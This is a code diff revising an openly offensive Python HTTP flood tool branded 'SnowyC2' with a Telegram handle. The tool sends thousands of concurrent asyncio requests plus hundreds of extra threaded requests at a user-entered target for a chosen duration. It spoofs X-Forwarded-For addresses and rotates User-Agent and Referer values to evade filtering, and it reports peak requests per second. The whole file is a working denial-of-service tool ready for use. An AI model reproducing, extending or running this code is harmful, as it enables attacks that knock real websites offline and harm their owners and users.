@@ -1,20 +1,23 @@
 import asyncio
 import aiohttp
 import random
+import time
+import threading
 import sys
 import os
 import psutil
-import time
+from concurrent.futures import ThreadPoolExecutor
 
-# Configuration
-MAX_CONCURRENT = 4000
+MAX_CONCURRENT = 3000  # Core engine size (adjustable)
+BOOSTER_THREADS = 300  # Request boosters (extra threads)
 REQUEST_TIMEOUT = 10
+
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
-    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1)",
+    "Mozilla/5.0 (Linux; Android 12; SM-G998U)",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+    "Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0"
 ]
 
 def load_referers():
@@ -24,14 +27,12 @@ def load_referers():
     except:
         return ["https://www.google.com/"]
 
-class AttackEngine:
+class SnowyC2:
     def __init__(self, method, target, duration):
         self.method = method
         self.target = target
         self.duration = duration
-        self.start_time = time.time()
         self.referers = load_referers()
-        self.process = psutil.Process(os.getpid())
         self.stats = {
             'total': 0,
             'success': 0,
@@ -39,92 +40,126 @@ class AttackEngine:
             'rps': 0,
             'peak_rps': 0
         }
+        self.start_time = 0
+        self.process = psutil.Process(os.getpid())
+        self.lock = threading.Lock()
 
     async def make_request(self, session):
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-            "Sec-Fetch-Dest": "document",
-            "Sec-Fetch-Mode": "navigate",
-            "Sec-Fetch-Site": "none",
-            "Sec-Fetch-User": "?1",
             "Referer": random.choice(self.referers),
             "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
         }
         try:
             async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
-                if response.status == 200:
-                    return "SUCCESS"
-                elif str(response.status).startswith("4"):
-                    return "ERROR"
-                return "OTHER"
+                status = response.status
+                with self.lock:
+                    self.stats['total'] += 1
+                    if status == 200:
+                        self.stats['success'] += 1
+                    else:
+                        self.stats['errors'] += 1
         except:
-            return "ERROR"
+            with self.lock:
+                self.stats['total'] += 1
+                self.stats['errors'] += 1
 
-    async def run_attack(self):
-        end_time = self.start_time + self.duration
+    async def batch_runner(self):
         conn = aiohttp.TCPConnector(limit_per_host=None)
         async with aiohttp.ClientSession(connector=conn) as session:
-            while time.time() < end_time:
+            while time.time() < self.start_time + self.duration:
                 tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
-                results = await asyncio.gather(*tasks)
-                self.stats['total'] += len(results)
-                self.stats['success'] += results.count("SUCCESS")
-                self.stats['errors'] += results.count("ERROR")
-                elapsed = time.time() - self.start_time
-                current_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
-                self.stats['rps'] = current_rps
-                self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)
-                self.print_status()
-                await asyncio.sleep(0.55)
-        self.print_summary()
+                await asyncio.gather(*tasks)
 
-    def print_status(self):
-        elapsed = time.time() - self.start_time
-        remaining = max(0, self.duration - elapsed)
-        ram_used_mb = self.process.memory_info().rss / 1024 / 1024
-        sys.stdout.write("\033[H\033[J")
-        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
-        print("=" * 60)
-        print(f" METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
-        print(f" REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
-        print(f" RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
-        print(f" RAM USAGE: {ram_used_mb:.2f} MB")
-        print(f" TIME REMAINING: {remaining:.1f}s")
-        print("=" * 60)
+    def booster(self):
+        import requests
+        session = requests.Session()
+        while time.time() < self.start_time + self.duration:
+            try:
+                headers = {
+                    "User-Agent": random.choice(USER_AGENTS),
+                    "Referer": random.choice(self.referers),
+                    "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
+                }
+                r = session.get(self.target, headers=headers, timeout=5)
+                with self.lock:
+                    self.stats['total'] += 1
+                    if r.status_code == 200:
+                        self.stats['success'] += 1
+                    else:
+                        self.stats['errors'] += 1
+            except:
+                with self.lock:
+                    self.stats['total'] += 1
+                    self.stats['errors'] += 1
 
-    def print_summary(self):
-        total_time = time.time() - self.start_time
-        avg_rps = self.stats['total'] / total_time if total_time > 0 else 0
-        print("\nATTACK COMPLETED")
+    def run_boosters(self):
+        for _ in range(BOOSTER_THREADS):
+            t = threading.Thread(target=self.booster)
+            t.daemon = True
+            t.start()
+
+    def print_status_loop(self):
+        while time.time() < self.start_time + self.duration:
+            time.sleep(0.5)
+            elapsed = time.time() - self.start_time
+            remaining = max(0, self.duration - elapsed)
+            rps = self.stats['total'] / elapsed if elapsed > 0 else 0
+            self.stats['rps'] = rps
+            self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)
+            ram = self.process.memory_info().rss / 1024 / 1024
+
+            sys.stdout.write("\033[H\033[J")
+            print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
+            print("=" * 60)
+            print(f"METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
+            print("=" * 60)
+            print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
+            print(f"RPS: {rps:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
+            print(f"REMAINING: {remaining:.1f}s | RAM USED: {ram:.2f} MB")
+            print("=" * 60)
+
+    def start(self):
+        self.start_time = time.time()
+
+        # Print status in background
+        threading.Thread(target=self.print_status_loop, daemon=True).start()
+
+        # Start boosters
+        self.run_boosters()
+
+        # Start batch
+        try:
+            asyncio.run(self.batch_runner())
+        except KeyboardInterrupt:
+            print("Stopped.")
+        except Exception as e:
+            print(f"Error: {e}")
+
+        # Final stats
+        print("\nFINISHED")
         print("=" * 60)
-        print(f" TARGET: {self.target}")
-        print(f" DURATION: {total_time:.1f}s")
-        print(f" TOTAL REQUESTS: {self.stats['total']}")
-        print(f" SUCCESS (200): {self.stats['success']}")
-        print(f" ERRORS (4xx): {self.stats['errors']}")
-        print(f" AVERAGE RPS: {avg_rps:.1f}")
+        print(f"TOTAL: {self.stats['total']}")
+        print(f"SUCCESS: {self.stats['success']}")
+        print(f"ERRORS: {self.stats['errors']}")
+        print(f"PEAK RPS: {self.stats['peak_rps']:.1f}")
         print("=" * 60)
 
 def main():
     print("\nSNOWYC2 - T.ME/STSVKINGDOM")
-    print("=" * 40)
-    method = "C-ECLIPSE"
+    print("=" * 60)
+    method = input("METHOD: ").strip()
     target = input("TARGET: ").strip()
-    duration = int(input("TIME (seconds): ").strip())
-    if not target.startswith(('http://', 'https://')):
+    if not target.startswith("http"):
         target = "http://" + target
     try:
-        engine = AttackEngine(method, target, duration)
-        asyncio.run(engine.run_attack())
-    except KeyboardInterrupt:
-        print("\nAttack stopped by user")
-    except Exception as e:
-        print(f"\nError: {e}")
+        duration = int(input("TIME (seconds): ").strip())
+    except:
+        print("Invalid TIME")
+        return
+
+    bot = SnowyC2(method, target, duration)
+    bot.start()
 
 if __name__ == "__main__":
     main()
